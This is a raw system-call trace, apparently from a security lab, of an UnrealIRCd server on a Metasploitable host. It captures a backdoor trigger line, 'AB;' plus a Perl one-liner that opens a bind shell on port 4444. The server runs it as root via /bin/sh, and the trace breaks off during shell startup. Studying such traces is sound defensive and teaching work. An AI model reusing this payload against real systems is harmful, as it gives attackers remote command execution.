4519  12:54:35.339925 select(1024, [2 3 4 6 8], [], NULL, {0, 950000}) = 1 (in [6], left {0, 750000})
4519  12:54:35.536412 clock_gettime(CLOCK_MONOTONIC, {21685, 353433359}) = 0
4519  12:54:35.536448 recv(6, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  12:54:35.536479 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536498 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536513 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536528 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536541 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536555 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536569 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536583 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536596 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536610 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536624 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536637 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536651 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536664 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536677 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536691 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536704 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536719 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536733 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536747 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536760 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536864 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.536913 gettimeofday({1495644875, 536917}, NULL) = 0
4519  12:54:35.536940 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  12:54:35.539378 clock_gettime(CLOCK_MONOTONIC, {21685, 356395904}) = 0
4519  12:54:35.539395 time(NULL)        = 1495644875
4519  12:54:35.539406 time(NULL)        = 1495644875
4519  12:54:35.539436 gettimeofday({1495644875, 539439}, NULL) = 0
4519  12:54:35.539447 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  12:54:35.539487 clock_gettime(CLOCK_MONOTONIC, {21685, 356499513}) = 0
4519  12:54:35.539497 gettimeofday({1495644875, 539500}, NULL) = 0
4519  12:54:35.539508 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  12:54:35.539565 clock_gettime(CLOCK_MONOTONIC, {21685, 356578409}) = 0
4519  12:54:35.539577 accept(2, 0, NULL) = 5
4519  12:54:35.539698 getpeername(5, {sa_family=AF_INET, sin_port=htons(37871), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  12:54:35.539731 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  12:54:35.539744 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  12:54:35.539757 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  12:54:35.539770 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  12:54:35.539781 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  12:54:35.539792 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  12:54:35.539805 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  12:54:35.539821 clock_gettime(CLOCK_MONOTONIC, {21685, 356899389}) = 0
4519  12:54:35.539901 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 7
4519  12:54:35.539929 fcntl64(7, F_GETFL) = 0x2 (flags O_RDWR)
4519  12:54:35.539948 fcntl64(7, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  12:54:35.539958 fcntl64(7, F_SETFD, FD_CLOEXEC) = 0
4519  12:54:35.539969 connect(7, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  12:54:35.539985 send(7, "6E\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  12:54:35.540097 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  12:54:35.540134 gettimeofday({1495644875, 540139}, NULL) = 0
4519  12:54:35.540146 select(1024, [2 3 4 6 7 8], [], NULL, {1, 0}) = 1 (in [7], left {1, 0})
4519  12:54:35.542580 clock_gettime(CLOCK_MONOTONIC, {21685, 359598593}) = 0
4519  12:54:35.542598 recvfrom(7, "6E\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\337\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  12:54:35.542653 close(7)          = 0
4519  12:54:35.542668 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  12:54:35.542682 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  12:54:35.542784 time(NULL)        = 1495644875
4519  12:54:35.542796 time(NULL)        = 1495644875
4519  12:54:35.542808 gettimeofday({1495644875, 542812}, NULL) = 0
4519  12:54:35.542844 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:54:35.542884 clock_gettime(CLOCK_MONOTONIC, {21685, 359897778}) = 0
4519  12:54:35.542895 gettimeofday({1495644875, 542899}, NULL) = 0
4519  12:54:35.542905 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [6], left {0, 700000})
4519  12:54:35.836410 clock_gettime(CLOCK_MONOTONIC, {21685, 653430590}) = 0
4519  12:54:35.836432 recv(6, "PRIVMSG  #testit1 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  12:54:35.836458 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836475 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836490 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836505 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836518 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836532 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836546 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836560 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836573 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836587 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836600 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836614 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836627 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836641 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836654 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836668 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836681 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836695 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836709 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836723 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836736 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836757 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.836774 gettimeofday({1495644875, 836778}, NULL) = 0
4519  12:54:35.836786 select(1024, [2 3 4 5 6 8], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  12:54:35.836837 clock_gettime(CLOCK_MONOTONIC, {21685, 653850863}) = 0
4519  12:54:35.836850 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  12:54:35.836878 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  12:54:35.836899 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  12:54:35.836912 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  12:54:35.836927 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 18437
18437 12:54:35.837018 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
18437 12:54:35.837033 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
18437 12:54:35.837044 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.837057 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
18437 12:54:35.837163 brk(0)            = 0x80f9000
18437 12:54:35.837185 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.837201 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1f000
18437 12:54:35.837218 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.837236 open("/etc/ld.so.cache", O_RDONLY) = 1
18437 12:54:35.837249 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18437 12:54:35.837268 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f17000
18437 12:54:35.837278 close(1)          = 0
18437 12:54:35.837289 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.837304 open("/lib/libncurses.so.5", O_RDONLY) = 1
18437 12:54:35.837317 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
18437 12:54:35.837426 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
18437 12:54:35.837444 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ee7000
18437 12:54:35.837457 mmap2(0xb7f14000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f14000
18437 12:54:35.837474 close(1)          = 0
18437 12:54:35.837486 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.837501 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
18437 12:54:35.837515 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
18437 12:54:35.837609 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
18437 12:54:35.837626 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ee3000
18437 12:54:35.837638 mmap2(0xb7ee5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ee5000
18437 12:54:35.837654 close(1)          = 0
18437 12:54:35.837665 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.837679 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
18437 12:54:35.837693 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
18437 12:54:35.837783 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
18437 12:54:35.837799 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee2000
18437 12:54:35.837814 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d93000
18437 12:54:35.837831 mmap2(0xb7edc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7edc000
18437 12:54:35.837848 mmap2(0xb7edf000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7edf000
18437 12:54:35.837863 close(1)          = 0
18437 12:54:35.837885 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d92000
18437 12:54:35.837897 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d926b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
18437 12:54:35.837954 mprotect(0xb7edc000, 4096, PROT_READ) = 0
18437 12:54:35.837991 munmap(0xb7f17000, 29913) = 0
18437 12:54:35.838018 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.838032 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
18437 12:54:35.838052 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcbd680) = -1 ENOTTY (Inappropriate ioctl for device)
18437 12:54:35.838086 brk(0)            = 0x80f9000
18437 12:54:35.838096 brk(0x80fa000)    = 0x80fa000
18437 12:54:35.838108 brk(0x80fb000)    = 0x80fb000
18437 12:54:35.838125 getuid32()        = 0
18437 12:54:35.838134 getgid32()        = 0
18437 12:54:35.838143 geteuid32()       = 0
18437 12:54:35.838152 getegid32()       = 0
18437 12:54:35.838166 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.838179 time(NULL)        = 1495644875
18437 12:54:35.838192 brk(0x80fc000)    = 0x80fc000
18437 12:54:35.838206 brk(0x80fd000)    = 0x80fd000
18437 12:54:35.838226 open("/proc/meminfo", O_RDONLY) = 1
18437 12:54:35.838247 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
18437 12:54:35.838265 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1e000
18437 12:54:35.838277 read(1, "MemTotal:      1035240 kB\nMemFree:        216080 kB\nBuffers:        109952 kB\nCached:         537864 kB\nSwapCached:          0 kB\nActive:         283472 kB\nInactive:       493632 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        215840 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4860 kB\nWriteback:           0 kB\nAnonPages:      129296 kB\nMapped:          52024 kB\nSlab:            30576 kB\nSReclaimable:    21136 kB\nSUnreclaim:       9440 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635684 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
18437 12:54:35.838373 close(1)          = 0
18437 12:54:35.838385 munmap(0xb7f1e000, 4096) = 0
18437 12:54:35.838397 brk(0x80fe000)    = 0x80fe000
18437 12:54:35.838423 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
18437 12:54:35.838436 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
18437 12:54:35.838449 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18437 12:54:35.838460 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18437 12:54:35.838472 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
18437 12:54:35.838484 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
18437 12:54:35.838497 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18437 12:54:35.838509 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
18437 12:54:35.838522 uname({sys="Linux", node="metasploitable", ...}) = 0
18437 12:54:35.838570 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18437 12:54:35.838588 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18437 12:54:35.838606 brk(0x8100000)    = 0x8100000
18437 12:54:35.838618 getcwd("/etc/unreal", 4096) = 12
18437 12:54:35.838633 getpid()          = 18437
18437 12:54:35.838652 getppid()         = 4519
18437 12:54:35.838667 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18437 12:54:35.838687 stat64("/sbin/sh", 0xbfcbd658) = -1 ENOENT (No such file or directory)
18437 12:54:35.838699 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
18437 12:54:35.838717 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
18437 12:54:35.838741 socket(PF_FILE, SOCK_STREAM, 0) = 1
18437 12:54:35.838754 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
18437 12:54:35.838766 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
18437 12:54:35.838788 close(1)          = 0
18437 12:54:35.838799 socket(PF_FILE, SOCK_STREAM, 0) = 1
18437 12:54:35.838809 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
18437 12:54:35.838827 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
18437 12:54:35.838847 close(1)          = 0
18437 12:54:35.838861 open("/etc/nsswitch.conf", O_RDONLY) = 1
18437 12:54:35.838875 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
18437 12:54:35.838892 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1e000
18437 12:54:35.838907 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
18437 12:54:35.838957 read(1, "", 4096) = 0
18437 12:54:35.838966 close(1)          = 0
18437 12:54:35.838976 munmap(0xb7f1e000, 4096) = 0
18437 12:54:35.838992 open("/etc/ld.so.cache", O_RDONLY) = 1
18437 12:54:35.839005 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18437 12:54:35.839021 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f17000
18437 12:54:35.839031 close(1)          = 0
18437 12:54:35.839041 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18437 12:54:35.839056 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
18437 12:54:35.839071 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 